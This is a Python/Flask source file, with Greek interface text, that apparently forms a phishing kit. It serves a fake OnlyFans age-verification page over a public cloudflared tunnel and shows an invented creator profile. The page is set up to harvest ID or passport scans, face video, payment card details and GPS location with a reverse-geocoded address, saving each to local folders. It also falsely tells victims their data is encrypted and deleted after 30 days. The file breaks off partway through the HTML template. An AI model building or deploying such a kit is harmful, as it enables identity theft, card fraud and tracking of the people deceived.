import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip ήσυχα."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και τα απαιτούμενα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά ένα tunnel cloudflared και εμφανίζει το δημόσιο link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_creator_name():
    """Δημιουργεί ένα τυχαίο όνομα χρήστη τύπου OnlyFans creator."""
    first_names = ["Λενα", "Μαρια", "Χριστινα", "Σοφια", "Ελενη", "Αννα", "Δημητρα", "Βικυ", "Ρουλα", "Σασα",
                   "Ρεβεκκα", "Κωνσταντινα", "Αλεξ", "Γιωργος", "Ταησιη", "Κατερινα", "Μαργαριτα", "Αβελη", "Σκυλος"]
    
    last_names = ["Ραε", "Ροδου", "Ιωαννου", "Αλεξιου", "Αγαπη", "Βελλα", "Αστερα", "Φεγγαρι", "Ουρανος", "Αγρια",
                  "Φλόγα", "Καρδια", "Λανε", "Βασιλικη", "Καταιγιδα", "Δυτικα", "Νεα", "Πριγκηπας", "Διαμαντι"]
    
    username_variants = [
        f"{random.choice(first_names)}{random.choice(last_names)}",
        f"{random.choice(first_names)}OF",
        f"{random.choice(first_names)}_{random.choice(last_names)}",
        f"Επισης{random.choice(first_names)}",
        f"Πραγματικη{random.choice(first_names)}",
        f"{random.choice(first_names)}x{random.choice(last_names)}",
        f"{random.choice(first_names).lower()}{random.randint(10, 999)}",
        f"{random.choice(first_names)}_{random.choice(last_names)}{random.randint(10, 99)}"
    ]
    
    return random.choice(username_variants)

def find_profile_picture(folder):
    """Αναζήτηση για αρχείο εικόνας στον φάκελο για χρήση ως εικόνα προφίλ."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
    
    return None

def get_verification_settings():
    """Λήψη προτιμήσεων χρήστη για τη διαδικασία επαλήθευσης."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ ΗΛΙΚΙΑΣ ONLYFANS")
    print("="*60)
    
    # Λήψη ονόματος χρήστη στόχου
    print("\n[+] ΡΥΘΜΙΣΕΙΣ ΠΡΟΦΙΛ ΔΗΜΙΟΥΡΓΟΥ")
    print("Εισάγετε το όνομα χρήστη OnlyFans για εμφάνιση στη σελίδα επαλήθευσης")
    print("Αφήστε κενό για τυχαία δημιουργία ονόματος")
    
    username_input = input("Όνομα δημιουργού (ή πατήστε Enter για τυχαίο): ").strip()
    if username_input:
        settings = {'target_username': username_input}
    else:
        random_username = generate_creator_name()
        settings = {'target_username': random_username}
        print(f"[+] Δημιουργήθηκε όνομα δημιουργού: {random_username}")
    
    # Δημιουργία τιμής συνδρομής
    subscription_prices = ["€4.99", "€9.99", "€14.99", "€19.99", "€24.99"]
    settings['subscription_price'] = random.choice(subscription_prices)
    
    # Δημιουργία αριθμού ακολούθων
    settings['follower_count'] = random.randint(10000, 500000)
    
    # Δημιουργία τύπου περιεχομένου
    content_types = ["Δημιουργός Ρητού Περιεχομένου", "Ενήλικο Μοντέλο", "Δημιουργός Περιεχομένου", "Premium Μοντέλο"]
    settings['content_type'] = random.choice(content_types)
    
    # Αναζήτηση εικόνας προφίλ
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως εικόνα προφίλ")
    
    print(f"\n[+] Επαλήθευση για: @{settings['target_username']}")
    print(f"[+] Συνδρομή: {settings['subscription_price']}/μήνα")
    print(f"[+] Ακόλουθοι: {settings['follower_count']:,}")
    print(f"[+] Τύπος Περιεχομένου: {settings['content_type']}")
    
    # Επαλήθευση ηλικίας
    print("\n1. Μέθοδος Επαλήθευσης Ηλικίας:")
    print("Επιλέξτε μέθοδο επαλήθευσης για πρόσβαση σε ενήλικο περιεχόμενο:")
    print("Α - Διαβατήριο/Ταυτότητα + Selfie (Συνιστάται)")
    print("B - Επαλήθευση πιστωτικής κάρτας (Γρήγορη)")
    print("Γ - Και οι δύο μέθοδοι")
    
    while True:
        method = input("Επιλέξτε μέθοδο (Α/Β/Γ, προεπιλογή: Α): ").strip().upper()
        if not method:
            method = 'Α'
        if method in ['Α', 'Β', 'Γ']:
            if method == 'Α':
                settings['age_method'] = 'id_selfie'
                settings['id_enabled'] = True
                settings['face_enabled'] = True
                settings['payment_enabled'] = False
            elif method == 'Β':
                settings['age_method'] = 'payment'
                settings['id_enabled'] = False
                settings['face_enabled'] = False
                settings['payment_enabled'] = True
            else:
                settings['age_method'] = 'both'
                settings['id_enabled'] = True
                settings['face_enabled'] = True
                settings['payment_enabled'] = True
            break
        else:
            print("Παρακαλώ εισάγετε Α, Β, ή Γ.")
    
    if settings['id_enabled']:
        # Διάρκεια σάρωσης προσώπου
        print("\n2. Διάρκεια Επαλήθευσης Προσώπου:")
        while True:
            try:
                duration = input("Δευτερόλεπτα για επαλήθευση προσώπου (5-30, προεπιλογή: 15): ").strip()
                if not duration:
                    settings['face_duration'] = 15
                    break
                duration = int(duration)
                if 5 <= duration <= 30:
                    settings['face_duration'] = duration
                    break
                else:
                    print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 30.")
            except ValueError:
                print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    
    if settings['payment_enabled']:
        # Ποσό πληρωμής
        print("\n3. Ποσό Επαλήθευσης Πληρωμής:")
        print("Ποσό χρέωσης για επαλήθευση ηλικίας (θα επιστραφεί)")
        while True:
            try:
                amount = input("Ποσό σε € (0.01-10.00, προεπιλογή: 1.00): ").strip()
                if not amount:
                    settings['payment_amount'] = "1.00"
                    break
                # Επικύρωση μορφής ποσού
                if re.match(r'^\d+(\.\d{1,2})?$', amount):
                    settings['payment_amount'] = amount
                    break
                else:
                    print("Παρακαλώ εισάγετε έγκυρο ποσό (π.χ., 1.00)")
            except:
                print("Παρακαλώ εισάγετε έγκυρο ποσό.")
    
    # Επαλήθευση τοποθεσίας
    print("\n4. Επαλήθευση Τοποθεσίας:")
    print("Απαιτείται επαλήθευση τοποθεσίας για περιορισμούς περιεχομένου;")
    location_enabled = input("Ενεργοποίηση τοποθεσίας (ν/ο, προεπιλογή: ο): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['ν', 'ναι', 'yes', 'y']
    
    return settings

# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---

geolocator = Nominatim(user_agent="onlyfans_verification")

def process_and_save_location(data, session_id):
    """Επεξεργασία και αποθήκευση δεδομένων τοποθεσίας."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Λήψη πληροφοριών διεύθυνσης
        address_details = {}
        full_address = "Άγνωστο"
        try:
            location = geolocator.reverse((lat, lon), language='el', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Προετοιμασία δομημένων δεδομένων
        location_data = {
            "platform": "onlyfans_age_verification",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy')
            },
            "address_information": {
                "full_address": full_address,
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "country": address_details.get("country")
            },
            "verification_data": {
                "target_username": data.get('target_username', 'άγνωστο'),
                "age_verified": True,
                "content_restricted": data.get('content_restricted', False)
            }
        }
        
        # Αποθήκευση σε αρχείο
        filename = f"onlyfans_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Αποθηκεύτηκαν δεδομένα τοποθεσίας OnlyFans: {filename}")
        
    except Exception as e:
        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")

# --- Flask Εφαρμογή ---

app = Flask(__name__)

# Καθολικές ρυθμίσεις
VERIFICATION_SETTINGS = {
    'target_username': generate_creator_name(),
    'subscription_price': "€9.99",
    'follower_count': random.randint(50000, 250000),
    'content_type': "Δημιουργός Ενήλικου Περιεχομένου",
    'age_method': 'id_selfie',
    'id_enabled': True,
    'face_enabled': True,
    'payment_enabled': False,
    'payment_amount': "1.00",
    'face_duration': 15,
    'location_enabled': False,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/OnlyFans Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_verification'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'payment_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_greek_html_template(settings):
    """Δημιουργεί το ελληνικό πρότυπο επαλήθευσης ηλικίας OnlyFans."""
    target_username = settings['target_username']
    subscription_price = settings['subscription_price']
    follower_count = f"{settings['follower_count']:,}"
    content_type = settings['content_type']
    face_duration = settings.get('face_duration', 15)
    payment_amount = settings.get('payment_amount', "1.00")
    profile_picture = settings.get('profile_picture')
    
    # Υπολογισμός βημάτων
    total_steps = 2  # Εισαγωγή + Πύλη ηλικίας
    if settings['id_enabled'] and settings['face_enabled']:
        total_steps += 2  # Ταυτότητα + Πρόσωπο
    elif settings['id_enabled'] or settings['face_enabled']:
        total_steps += 1
    
    if settings['payment_enabled']:
        total_steps += 1  # Πληρωμή
    
    if settings['location_enabled']:
        total_steps += 1  # Τοποθεσία
    
    total_steps += 1  # Τελική επεξεργασία
    
    template = f'''<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OnlyFans - Απαιτείται Επαλήθευση Ηλικίας</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --onlyfans-pink: #00AFF0;
            --onlyfans-dark: #1a1a1a;
            --onlyfans-light: #f8f9fa;
            --onlyfans-border: #e1e1e1;
            --onlyfans-text: #333333;
            --onlyfans-muted: #6c757d;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: var(--onlyfans-light);
            color: var(--onlyfans-text);
            line-height: 1.6;
        }}
        
        .verification-container {{
            max-width: 800px;
            margin: 20px auto;
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }}
        
        /* Header Styles */
        .header {{
            background: linear-gradient(135deg, var(--onlyfans-pink), #0088cc);
            color: white;
            padding: 30px 40px;
            text-align: center;
        }}
        
        .logo {{
            font-size: 2.5rem;
            font-weight: 700;
            letter-spacing: -1px;
            margin-bottom: 10px;
        }}
        
        .logo span {{
            color: white;
        }}
        
        .tagline {{
            font-size: 1.1rem;
            opacity: 0.9;
            margin-bottom: 20px;
        }}
        
        /* Creator Profile */
        .creator-profile {{
            display: flex;
            align-items: center;
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            backdrop-filter: blur(10px);
        }}
        
        .creator-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            overflow: hidden;
            margin-right: 20px;
            border: 3px solid white;
        }}
        
        .creator-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .creator-info {{
            flex: 1;
        }}
        
        .creator-name {{
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 5px;
        }}
        
        .creator-stats {{
            display: flex;
            gap: 20px;
            font-size: 0.9rem;
            opacity: 0.9;
        }}
        
        /* Content Area */
        .content-area {{
            padding: 40px;
        }}
        
        /* Step Navigation */
        .step-nav {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }}
        
        .step-nav::before {{
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--onlyfans-border);
            z-index: 1;
        }}
        
        .step {{
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }}
        
        .step-circle {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--onlyfans-border);
            color: var(--onlyfans-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            margin-bottom: 10px;
            border: 3px solid white;
            transition: all 0.3s;
        }}
        
        .step-circle.active {{
            background: var(--onlyfans-pink);
            color: white;
            transform: scale(1.1);
        }}
        
        .step-circle.completed {{
            background: #28a745;
            color: white;
        }}
        
        .step-label {{
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--onlyfans-muted);
            text-align: center;
        }}
        
        .step-label.active {{
            color: var(--onlyfans-pink);
            font-weight: 600;
        }}
        
        /* Step Content */
        .step-content {{
            display: none;
            animation: fadeIn 0.5s;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(10px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-content.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 1.8rem;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--onlyfans-dark);
        }}
        
        .step-description {{
            color: var(--onlyfans-muted);
            margin-bottom: 30px;
            font-size: 1.1rem;
        }}
        
        /* Age Gate Warning */
        .age-warning {{
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 30px;
        }}
        
        .warning-icon {{
            font-size: 2rem;
            color: #856404;
            margin-bottom: 15px;
        }}
        
        /* Verification Methods */
        .method-card {{
            border: 2px solid var(--onlyfans-border);
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .method-card:hover {{
            border-color: var(--onlyfans-pink);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 175, 240, 0.1);
        }}
        
        .method-card.selected {{
            border-color: var(--onlyfans-pink);
            background: rgba(0, 175, 240, 0.05);
        }}
        
        .method-icon {{
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: var(--onlyfans-pink);
        }}
        
        .method-title {{
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 10px;
        }}
        
        .method-description {{
            color: var(--onlyfans-muted);
            margin-bottom: 15px;
        }}
        
        .method-badge {{
            display: inline-block;
            background: var(--onlyfans-pink);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
            margin-top: 10px;
        }}
        
        /* Face Verification */
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 30px;
            border-radius: 10px;
            overflow: hidden;
            background: #000;
            border: 3px solid var(--onlyfans-pink);
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
        }}
        
        /* ID Upload */
        .upload-area {{
            border: 3px dashed var(--onlyfans-border);
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
        }}
        
        .upload-area:hover {{
            border-color: var(--onlyfans-pink);
            background: rgba(0, 175, 240, 0.05);
        }}
        
        .upload-icon {{
            font-size: 3rem;
            color: var(--onlyfans-pink);
            margin-bottom: 20px;
        }}
        
        .upload-text {{
            font-size: 1.2rem;
            font-weight: 500;
            margin-bottom: 10px;
        }}
        
        .upload-subtext {{
            color: var(--onlyfans-muted);
            font-size: 0.9rem;
        }}
        
        .preview-container {{
            margin-top: 20px;
            display: none;
        }}
        
        .preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid var(--onlyfans-border);
        }}
        
        /* Payment Form */
        .payment-form {{
            background: #f8f9fa;
            border-radius: 10px;
            padding: 30px;
            margin: 20px 0;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        .form-label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--onlyfans-dark);
        }}
        
        .form-input {{
            width: 100%;
            padding: 12px 15px;
            border: 2px solid var(--onlyfans-border);
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: var(--onlyfans-pink);
        }}
        
        .card-details {{
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 15px;
        }}
        
        /* Buttons */
        .btn {{
            display: inline-block;
            padding: 14px 30px;
            background: var(--onlyfans-pink);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
        }}
        
        .btn:hover {{
            background: #0088cc;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 175, 240, 0.3);
        }}
        
        .btn:active {{
            transform: translateY(0);
        }}
        
        .btn:disabled {{
            background: var(--onlyfans-border);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }}
        
        .btn-block {{
            display: block;
            width: 100%;
        }}
        
        .btn-outline {{
            background: transparent;
            border: 2px solid var(--onlyfans-border);
            color: var(--onlyfans-dark);
        }}
        
        .btn-outline:hover {{
            background: var(--onlyfans-light);
            border-color: var(--onlyfans-pink);
            color: var(--onlyfans-pink);
        }}
        
        .button-group {{
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }}
        
        /* Status Messages */
        .status-message {{
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
        }}
        
        .status-success {{
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }}
        
        .status-error {{
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }}
        
        .status-processing {{
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }}
        
        /* Loading Spinner */
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            padding: 30px 40px;
            background: #f8f9fa;
            border-top: 1px solid var(--onlyfans-border);
            color: var(--onlyfans-muted);
            font-size: 0.9rem;
        }}
        
        .footer-links {{
            margin-top: 15px;
        }}
        
        .footer-links a {{
            color: var(--onlyfans-muted);
            text-decoration: none;
            margin: 0 10px;
        }}
        
        .footer-links a:hover {{
            color: var(--onlyfans-pink);
            text-decoration: underline;
        }}
        
        /* Timer */
        .timer {{
            font-size: 2rem;
            font-weight: 600;
            text-align: center;
            color: var(--onlyfans-pink);
            margin: 20px 0;
            font-family: 'Courier New', monospace;
        }}
        
        /* Instructions */
        .instructions {{
            background: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }}
        
        .instruction-item {{
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--onlyfans-border);
        }}
        
        .instruction-item:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .instruction-icon {{
            font-size: 1.5rem;
            margin-right: 15px;
            color: var(--onlyfans-pink);
        }}
        
        /* Completion Screen */
        .completion-screen {{
            text-align: center;
            padding: 50px 20px;
        }}
        
        .success-icon {{
            font-size: 5rem;
            color: #28a745;
            margin-bottom: 30px;
        }}
        
        .creator-access {{
            background: linear-gradient(135deg, var(--onlyfans-pink), #0088cc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2rem;
            font-weight: 700;
            margin: 20px 0;
        }}
        
        /* Age Restriction Warning */
        .age-restriction {{
            background: #dc3545;
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 20px 0;
            font-weight: 500;
        }}
        
        /* Responsive */
        @media (max-width: 768px) {{
            .verification-container {{
                margin: 10px;
                border-radius: 8px;
            }}
            
            .header, .content-area {{
                padding: 20px;
            }}
            
            .step-nav {{
                flex-wrap: wrap;
                justify-content: center;
                gap: 20px;
            }}
            
            .step-nav::before {{
                display: none;
            }}
            
            .creator-profile {{
                flex-direction: column;
                text-align: center;
            }}
            
            .creator-avatar {{
                margin-right: 0;
                margin-bottom: 15px;
            }}
            
            .button-group {{
                flex-direction: column;
            }}
            
            .card-details {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="verification-container">
        <!-- Header -->
        <div class="header">
            <div class="logo"><span>OnlyFans</span></div>
            <div class="tagline">Απαιτείται Επαλήθευση Ηλικίας</div>
            
            <!-- Creator Profile -->
            <div class="creator-profile">
                <div class="creator-avatar">
                    {'<img src="' + profile_picture + '">' if profile_picture else '<div style="background:linear-gradient(135deg,#00AFF0,#0088cc);width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:white;font-size:2rem;">' + target_username[0].upper() + '</div>'}
                </div>
                <div class="creator-info">
                    <div class="creator-name">@{target_username}</div>
                    <div class="creator-stats">
                        <span>{subscription_price}/μήνα</span>
                        <span>{follower_count} ακόλουθοι</span>
                        <span>{content_type}</span>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Age Restriction Warning -->
        <div class="age-restriction">
            ⚠️ Το περιεχόμενο αυτού του δημιουργού έχει περιορισμούς ηλικίας. Πρέπει να είστε 18+ για να συνεχίσετε.
        </div>
        
        <!-- Step Navigation -->
        <div class="content-area">
            <div class="step-nav" id="stepNav">
                <div class="step">
                    <div class="step-circle active">1</div>
                    <div class="step-label active">Πύλη Ηλικίας</div>
                </div>
                {'<div class="step" id="step2Indicator">' if (settings['id_enabled'] or settings['face_enabled']) else ''}
                {'<div class="step-circle">2</div>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
                {'<div class="step-label">' + ('Πρόσωπο/Ταυτότητα' if settings['id_enabled'] and settings['face_enabled'] else ('Ταυτότητα' if settings['id_enabled'] else 'Πρόσωπο')) + '</div>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
                {'</div>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
                {'<div class="step" id="step3Indicator">' if settings['payment_enabled'] else ''}
                {'<div class="step-circle">3</div>' if settings['payment_enabled'] else ''}
                {'<div class="step-label">Πληρωμή</div>' if settings['payment_enabled'] else ''}
                {'</div>' if settings['payment_enabled'] else ''}
                {'<div class="step" id="step4Indicator">' if settings['location_enabled'] else ''}
                {'<div class="step-circle">4</div>' if settings['location_enabled'] else ''}
                {'<div class="step-label">Τοποθεσία</div>' if settings['location_enabled'] else ''}
                {'</div>' if settings['location_enabled'] else ''}
                <div class="step">
                    <div class="step-circle">✓</div>
                    <div class="step-label">Ολοκλήρωση</div>
                </div>
            </div>
            
            <!-- Step 1: Age Gate -->
            <div class="step-content active" id="step1">
                <h2 class="step-title">Απαιτείται Επαλήθευση Ηλικίας</h2>
                <p class="step-description">
                    Για να αποκτήσετε πρόσβαση στο περιεχόμενο του @{target_username}, πρέπει να επαληθεύσετε ότι είστε 18 ετών ή άνω.
                    Επιλέξτε την προτιμώμενη μέθοδο επαλήθευσης παρακάτω.
                </p>
                
                <div class="age-warning">
                    <div class="warning-icon">⚠️</div>
                    <h3>Νομική Απαίτηση</h3>
                    <p>Το OnlyFans απαιτεί επαλήθευση ηλικίας για όλους τους χρήστες που αποκτούν πρόσβαση σε ενήλικο περιεχόμενο.
                    Αυτή είναι μια νομική απαίτηση για την πρόληψη πρόσβασης ανηλίκων σε ρητό υλικό.</p>
                </div>
                
                <!-- Verification Methods -->
                {'<div class="method-card" id="idMethod" onclick="selectMethod(\'id\')">' if settings['id_enabled'] else ''}
                {'<div class="method-icon">🪪</div>' if settings['id_enabled'] else ''}
                {'<h3 class="method-title">Ταυτότητα + Selfie</h3>' if settings['id_enabled'] else ''}
                {'<p class="method-description">Ανεβάστε ταυτότητα ή διαβατήριο και τραβήξτε selfie για επαλήθευση. Η πιο ασφαλής μέθοδος.</p>' if settings['id_enabled'] else ''}
                {'<div class="method-badge">Συνιστάται</div>' if settings['id_enabled'] else ''}
                {'</div>' if settings['id_enabled'] else ''}
                
                {'<div class="method-card" id="paymentMethod" onclick="selectMethod(\'payment\')">' if settings['payment_enabled'] else ''}
                {'<div class="method-icon">💳</div>' if settings['payment_enabled'] else ''}
                {'<h3 class="method-title">Στιγμιαία Επαλήθευση Πληρωμής</h3>' if settings['payment_enabled'] else ''}
                {'<p class="method-description">Επαληθεύστε την ηλικία σας αμέσως με μια προσωρινή χρέωση {payment_amount}€. Γρήγορη και βολική.</p>' if settings['payment_enabled'] else ''}
                {'</div>' if settings['payment_enabled'] else ''}
                
                <div class="instructions">
                    <div class="instruction-item">
                        <div class="instruction-icon">🔒</div>
                        <div>
                            <strong>Τα δεδομένα σας είναι ασφαλή</strong><br>
                            Όλα τα δεδομένα επαλήθευσης κρυπτογραφούνται και διαγράφονται μετά από 30 ημέρες
                        </div>
                    </div>
                    <div class="instruction-item">
                        <div class="instruction-icon">⚖️</div>
                        <div>
                            <strong>Νομική συμμόρφωση</strong><br>
                            Απαιτείται από το νόμο για πλατφόρμες ενήλικου περιεχομένου
                        </div>
                    </div>
                </div>
                
                <div class="button-group">
                    <button class="btn btn-block" onclick="continueToVerification()" id="continueBtn" disabled>
                        Συνέχεια στην Επαλήθευση
                    </button>
                    <button class="btn btn-outline btn-block" onclick="declineAgeGate()">
                        Είμαι κάτω των 18
                    </button>
                </div>
            </div>
            
            <!-- Step 2: Face/ID Verification -->
            {'<div class="step-content" id="step2">' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'<h2 class="step-title">Επαλήθευση Ταυτότητας</h2>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'<p class="step-description">' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'Επαληθεύστε την ταυτότητά σας για πρόσβαση στο περιεχόμενο του @' + target_username + '.' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'</p>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            
            {'<div class="instructions">' if settings['face_enabled'] else ''}
            {'<h3>Επαλήθευση Προσώπου</h3>' if settings['face_enabled'] else ''}
            {'<p>Πρέπει να επαληθεύσουμε ότι ταιριάζετε με την φωτογραφία της ταυτότητάς σας.</p>' if settings['face_enabled'] else ''}
            {'<div class="camera-container">' if settings['face_enabled'] else ''}
            {'<video id="faceVideo" autoplay playsinline></video>' if settings['face_enabled'] else ''}
